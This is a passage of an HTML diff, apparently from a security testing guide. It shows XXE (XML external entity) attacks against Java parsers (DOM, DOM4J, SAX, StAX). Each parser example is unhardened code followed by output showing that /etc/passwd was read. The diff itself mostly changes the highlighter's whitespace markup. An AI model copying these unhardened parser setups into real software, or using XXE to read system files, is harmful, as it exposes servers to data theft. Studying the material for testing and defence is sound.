+<span class="w">   </span><span class="n">NodeList</span><span class="w"> </span><span class="n">nodeList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">doc</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;contact&quot;</span><span class="p">);</span>
+<span class="w">   </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">getLength</span><span class="p">();</span><span class="w"> </span><span class="n">s</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">     </span><span class="n">Node</span><span class="w"> </span><span class="n">firstNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nodeList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+<span class="w">     </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">firstNode</span><span class="p">.</span><span class="na">getNodeType</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">Node</span><span class="p">.</span><span class="na">ELEMENT_NODE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNode</span><span class="p">;</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;firstname&quot;</span><span class="p">);</span>
+<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">firstNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">firstNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">firstName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
+<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;First Name: &quot;</span><span class="w">  </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">firstName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">firstElement</span><span class="p">.</span><span class="na">getElementsByTagName</span><span class="p">(</span><span class="s">&quot;lastname&quot;</span><span class="p">);</span>
+<span class="w">       </span><span class="n">Element</span><span class="w"> </span><span class="n">lastNameElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Element</span><span class="p">)</span><span class="w"> </span><span class="n">lastNameElementList</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="w">       </span><span class="n">NodeList</span><span class="w"> </span><span class="n">lastName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lastNameElement</span><span class="p">.</span><span class="na">getChildNodes</span><span class="p">();</span>
+<span class="w">       </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&quot;Last Name: &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">Node</span><span class="p">)</span><span class="w"> </span><span class="n">lastName</span><span class="p">.</span><span class="na">item</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="na">getNodeValue</span><span class="p">());</span>
+<span class="w">     </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <p>The previous code produces the following output:</p>
-<div class="highlight"><pre><span></span><code>$ javac parseDocument.java <span class="p">;</span> java parseDocument
-First Name: John
-Last Name: <span class="c1">### User Database</span>
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>javac<span class="w"> </span>parseDocument.java<span class="w"> </span><span class="p">;</span><span class="w"> </span>java<span class="w"> </span>parseDocument
+First<span class="w"> </span>Name:<span class="w"> </span>John
+Last<span class="w"> </span>Name:<span class="w"> </span><span class="c1">### User Database</span>
 ...
-nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
-root:*:0:0:System Administrator:/var/root:/bin/sh
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
 </code></pre></div>
 <h5 id="xxe-using-dom4j">XXE using DOM4J<a class="headerlink" href="#xxe-using-dom4j" title="Permanent link">&para;</a></h5>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.Document</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.DocumentException</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.OutputFormat</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.XMLWriter</span><span class="p">;</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.Document</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.DocumentException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.SAXReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.OutputFormat</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.dom4j.io.XMLWriter</span><span class="p">;</span>
 
-<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test1</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">Document</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w"></span>
-<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">SAXReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXReader</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="w">  </span><span class="n">OutputFormat</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OutputFormat</span><span class="p">.</span><span class="na">createPrettyPrint</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">XMLWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLWriter</span><span class="p">(</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">,</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="w"> </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">test1</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">Document</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">SAXReader</span><span class="w"> </span><span class="n">reader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SAXReader</span><span class="p">();</span>
+<span class="w">   </span><span class="n">document</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">reader</span><span class="p">.</span><span class="na">read</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="n">OutputFormat</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">OutputFormat</span><span class="p">.</span><span class="na">createPrettyPrint</span><span class="p">();</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">XMLWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLWriter</span><span class="p">(</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">,</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="p">);</span>
+<span class="w">   </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <p>The previous code produces the following output:</p>
-<div class="highlight"><pre><span></span><code>$ java test1
-&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
-&lt;!DOCTYPE contacts SYSTEM <span class="s2">&quot;contacts.dtd&quot;</span>&gt;
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>test1
+&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>?&gt;
+&lt;!DOCTYPE<span class="w"> </span>contacts<span class="w"> </span>SYSTEM<span class="w"> </span><span class="s2">&quot;contacts.dtd&quot;</span>&gt;
 
 &lt;contacts&gt;
- &lt;contact&gt;
-  &lt;firstname&gt;John&lt;/firstname&gt;
-  &lt;lastname&gt;### User Database
+<span class="w"> </span>&lt;contact&gt;
+<span class="w">  </span>&lt;firstname&gt;John&lt;/firstname&gt;
+<span class="w">  </span>&lt;lastname&gt;###<span class="w"> </span>User<span class="w"> </span>Database
 ...
-nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
-root:*:0:0:System Administrator:/var/root:/bin/sh
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
 </code></pre></div>
 <h5 id="xxe-using-sax">XXE using SAX<a class="headerlink" href="#xxe-using-sax" title="Permanent link">&para;</a></h5>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParser</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.SAXException</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="p">;</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParser</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.SAXException</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">org.xml.sax.helpers.DefaultHandler</span><span class="p">;</span>
 
-<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">DefaultHandler</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">new</span><span class="w"> </span><span class="n">parseDocument</span><span class="p">();</span><span class="w"></span>
-<span class="w"> </span><span class="p">}</span><span class="w"></span>
-<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="nf">parseDocument</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">SAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAXParserFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="w"> </span><span class="p">}</span><span class="w"></span>
-<span class="w"> </span><span class="nd">@Override</span><span class="w"></span>
-<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">characters</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SAXException</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">tmpValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">);</span><span class="w"></span>
-<span class="w">  </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">tmpValue</span><span class="p">);</span><span class="w"></span>
-<span class="w"> </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">DefaultHandler</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">new</span><span class="w"> </span><span class="n">parseDocument</span><span class="p">();</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="nf">parseDocument</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">SAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SAXParserFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">   </span><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span>
+<span class="w">   </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span><span class="w"> </span><span class="k">this</span><span class="p">);</span>
+<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="w"> </span><span class="nd">@Override</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">characters</span><span class="p">(</span><span class="kt">char</span><span class="o">[]</span><span class="w"> </span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SAXException</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">String</span><span class="w"> </span><span class="n">tmpValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">(</span><span class="n">ac</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">j</span><span class="p">);</span>
+<span class="w">  </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">tmpValue</span><span class="p">);</span>
+<span class="w"> </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 <p>The previous code produces the following output:</p>
-<div class="highlight"><pre><span></span><code>$ java parseDocument
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>java<span class="w"> </span>parseDocument
 John
 <span class="c1">#### User Database</span>
 ...
-nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
-root:*:0:0:System Administrator:/var/root:/bin/sh
+nobody:*:-2:-2:Unprivileged<span class="w"> </span>User:/var/empty:/usr/bin/false
+root:*:0:0:System<span class="w"> </span>Administrator:/var/root:/bin/sh
 </code></pre></div>
 <h5 id="xxe-using-stax">XXE using StAX<a class="headerlink" href="#xxe-using-stax" title="Permanent link">&para;</a></h5>
-<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLStreamReader</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLInputFactory</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileReader</span><span class="p">;</span><span class="w"></span>
-<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w"></span>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.parsers.SAXParserFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLStreamReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">javax.xml.stream.XMLInputFactory</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.File</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileReader</span><span class="p">;</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span>
 
-<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">XMLInputFactory</span><span class="w"> </span><span class="n">xmlif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="n">FileReader</span><span class="w"> </span><span class="n">fr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span><span class="w"></span>
-<span class="w">   </span><span class="n">XMLStreamReader</span><span class="w"> </span><span class="n">xmlfer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlif</span><span class="p">.</span><span class="na">createXMLStreamReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span><span class="w"></span>
-<span class="w">                                            </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">));</span><span class="w"></span>
-<span class="w">   </span><span class="kt">int</span><span class="w"> </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getEventType</span><span class="p">();</span><span class="w"></span>
-<span class="w">   </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">    </span><span class="n">eventType</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlfer</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w"></span>
-<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">hasText</span><span class="p">()){</span><span class="w"></span>
-<span class="w">     </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">print</span><span class="p">(</span><span class="n">xmlfer</span><span class="p">.</span><span class="na">getText</span><span class="p">());</span><span class="w"></span>
-<span class="w">    </span><span class="p">}</span><span class="w"></span>
-<span class="w">   </span><span class="p">}</span><span class="w"></span>
-<span class="w">   </span><span class="n">fr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
-<span class="w">   </span><span class="n">e</span><span class="p">.</span><span class="na">printStackTrace</span><span class="p">();</span><span class="w"></span>
-<span class="w">  </span><span class="p">}</span><span class="w"></span>
-<span class="w"> </span><span class="p">}</span><span class="w"></span>
-<span class="p">}</span><span class="w"></span>
+<span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">parseDocument</span><span class="w"> </span><span class="p">{</span>
+<span class="w"> </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">   </span><span class="n">XMLInputFactory</span><span class="w"> </span><span class="n">xmlif</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLInputFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span>
+<span class="w">   </span><span class="n">FileReader</span><span class="w"> </span><span class="n">fr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
+<span class="w">   </span><span class="n">File</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">File</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">);</span>
+<span class="w">   </span><span class="n">XMLStreamReader</span><span class="w"> </span><span class="n">xmlfer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlif</span><span class="p">.</span><span class="na">createXMLStreamReader</span><span class="p">(</span><span class="s">&quot;contacts.xml&quot;</span><span class="p">,</span>
